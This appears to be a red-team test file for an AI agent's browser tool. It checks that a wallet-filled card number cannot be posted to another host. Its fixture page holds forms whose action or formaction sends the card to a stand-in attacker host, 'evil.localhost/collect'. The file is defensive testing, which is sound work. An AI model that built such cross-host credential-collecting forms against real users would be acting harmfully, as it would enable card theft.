/**
 * Red team: getting a typed value sent somewhere its item doesn't allow, after a person approves
 * something that looked fine. Each test asserts the secure outcome.
 */
import { afterAll, afterEach, beforeAll, describe, expect, test } from "bun:test";
import type { HaloError } from "../src/runtime/errors.js";
import { chromeProvider, closeChromeSessions, findChrome } from "../src/runtime/providers/chrome.js";
import type { ToolApprovalRequest, ToolCall, ToolServices } from "../src/runtime/tools.js";
import { walletItem } from "../src/runtime/wallet.js";

const chrome = findChrome();
const CARD = "4242424242424242";
let server: ReturnType<typeof Bun.serve>;
let BASE = "";
const received: string[] = [];

const page = (port: number) => `<!doctype html><title>Checkout</title>
<form id="f" method="post" action="http://evil.localhost:${port}/collect"><input id="card" name="card" autocomplete="cc-number"><button id="pay">Pay</button></form>
<form id="g" method="post" action="/collect-here"><input id="card2" name="card" autocomplete="cc-number"><button id="pay2" formaction="http://evil.localhost:${port}/collect">Pay</button></form>
<form id="h" method="post" action="/collect-here"><input id="card3" name="card" autocomplete="cc-number"><button id="pay3">Pay</button></form>`;

beforeAll(() => {
  if (!chrome) return;
  server = Bun.serve({
    port: 0,
    hostname: "127.0.0.1",
    async fetch(req) {
      const url = new URL(req.url);
      if (req.method === "POST") {
        received.push(`${url.hostname}${url.pathname} ${await req.text()}`);
        return new Response("<title>Done</title>ok", { headers: { "Content-Type": "text/html" } });
      }
      return new Response(page(server.port!), { headers: { "Content-Type": "text/html" } });
    },
  });
  BASE = `http://127.0.0.1:${server.port}/`;
});
afterAll(async () => {
  await closeChromeSessions();
  server?.stop(true);
});
afterEach(async () => {
  await closeChromeSessions();
  received.length = 0;
});

let n = 0;
function attacker(secret = false) {
  const runId = `chain-${++n}`;
  const requests: ToolApprovalRequest[] = [];
  // Where a form sends matters for personal items: a card locks the browser, so nothing is submitted by the agent at all.
  const items = { Card: walletItem("Card", (k) => ({ source: "mock", ...(secret ? { kind: "card" } : {}), fields: ["number:cc-number"], hosts: ["127.0.0.1"] })[k as string]) };
  const run = (method: string, named: Record<string, unknown> = {}) => {
    const cfg: Record<string, unknown> = { headless: false, allow: ["127.0.0.1", "evil.localhost"], wallet: ["Card"] };
    const call: ToolCall = { tool: { name: "Web", provider: "Chrome", args: [], namedArgs: {}, argList: [] }, method, positional: [], named, config: (k) => cfg[k as string], viaAgent: true, signal: new AbortController().signal, runId };
    const services = { wallet: (names: string[]) => names.map((x) => items[x as "Card"]), approve: async (r: ToolApprovalRequest) => (requests.push(r), true), walletEvent: () => {}, env: {} } as unknown as ToolServices;
    return chromeProvider(call, services).catch((e: unknown) => e as HaloError);
  };
  return { run, requests };
}

describe.skipIf(!chrome)("red team: where a typed value goes", () => {
  for (const [name, field, button] of [
    ["a form whose action is another host", "#card", "#pay"],
    ["a button whose formaction is another host", "#card2", "#pay2"],
  ] as const) {
    test(`${name}: the card is never posted there`, async () => {
      const a = attacker();
      await a.run("open", { url: BASE });
      await a.run("fill_secrets", { fields: { [field]: "Card.number" } });
      await a.run("click", { selector: button });
      await Bun.sleep(300);
      expect(received.filter((r) => r.startsWith("evil.localhost"))).toEqual([]);
    }, 60_000);
  }

  test("after a card is typed, the agent can't submit any form at all: the browser is the person's", async () => {
    const a = attacker(true);
    await a.run("open", { url: BASE });
    await a.run("fill_secrets", { fields: { "#card3": "Card.number" } });
    expect(((await a.run("click", { selector: "#pay3" })) as HaloError).code).toBe("WALLET_LOCKED");
    await Bun.sleep(300);
    expect(received).toEqual([]);
  }, 60_000);

  test("a form posting to the page's own host still works, and the question says where it posts", async () => {
    const a = attacker();
    await a.run("open", { url: BASE });
    await a.run("fill_secrets", { fields: { "#card3": "Card.number" } });
    await a.run("click", { selector: "#pay3" });
    await Bun.sleep(300);
    expect(received).toEqual([`127.0.0.1/collect-here card=${CARD}`]);
    expect(a.requests.at(-1)!.message).toContain(`It sends the form to 127.0.0.1.`);
  }, 60_000);
});
